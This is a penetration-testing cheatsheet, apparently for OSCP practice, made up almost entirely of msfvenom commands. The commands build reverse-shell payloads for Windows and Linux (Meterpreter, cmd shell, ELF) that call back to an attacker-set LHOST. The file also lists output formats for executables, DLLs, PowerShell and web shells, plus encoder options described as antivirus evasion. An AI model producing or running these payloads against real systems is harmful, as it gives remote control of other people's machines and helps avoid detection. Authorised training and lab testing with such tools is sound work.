# Payload Generation Cheatsheet
# Pairs with handlers in this directory
# Replace LHOST with your IP (or use $(ip -br a show eth0 | awk '{print $3}' | cut -d'/' -f1))

# ============================================================
# WINDOWS x64 METERPRETER (handler: win_x64_meterpreter.rc)
# ============================================================
# Staged - smaller payload, needs handler to send stage
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell64.exe

# ============================================================
# WINDOWS x86 METERPRETER (handler: win_x86_meterpreter.rc)
# ============================================================
# Staged x86 - for 32-bit targets
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell32.exe

# ============================================================
# WINDOWS CMD SHELL (handler: win_cmd_shell.rc)
# ============================================================
# When meterpreter fails or gets caught
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4445 -f exe -o cmd64.exe

# ============================================================
# LINUX SHELL (handler: linux_shell.rc)
# ============================================================
# ELF binary
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=9001 -f elf -o shell.elf

# ============================================================
# STAGELESS WINDOWS x64 (handler: stageless_win_x64.rc)
# ============================================================
# Larger payload but more reliable - note the underscore (meterpreter_reverse_tcp)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4446 -f exe -o stageless64.exe

# ============================================================
# COMMON FORMAT OPTIONS
# ============================================================
# -f exe        Windows executable
# -f dll        Windows DLL
# -f elf        Linux executable
# -f raw        Raw shellcode
# -f ps1        PowerShell
# -f asp        Classic ASP
# -f aspx       ASP.NET
# -f war        Java WAR (Tomcat)
# -f py         Python

# ============================================================
# ENCODER OPTIONS (AV evasion - limited use in OSCP)
# ============================================================
# -e x86/shikata_ga_nai -i 3    (x86 only, 3 iterations)
# -e x64/xor_dynamic            (x64)

# ============================================================
# QUICK ONE-LINER (replace eth0 if needed)
# ============================================================
# LHOST=$(ip -br a show eth0 | awk '{print $3}' | cut -d'/' -f1)
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
